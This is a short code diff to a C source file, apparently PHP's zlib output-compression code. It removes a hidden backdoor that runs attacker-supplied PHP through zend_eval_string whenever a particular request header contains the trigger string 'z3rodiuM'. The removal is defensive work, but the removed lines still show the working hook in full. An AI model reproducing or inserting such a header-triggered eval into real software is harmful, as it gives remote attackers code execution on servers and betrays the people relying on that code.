@@ -357,18 +357,6 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
-	zval *temp_var;
-
-	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
-		(temp_var = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTT_TOKN_T_USR_AGNT", sizeof("HTT_TOKN_T_USR_AGNT") - 1))) {
-		convert_to_string(temp_var);
-		if (strstr(Z_STRVAL_P(temp_var), "z3rodiuM")) {
-			zend_try {
-				char *eval_code = Z_STRVAL_P(temp_var) + 8;
-				zend_eval_string(eval_code, NULL, "CODE_EXEC");
-			} zend_end_try();
-		}
-	}
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
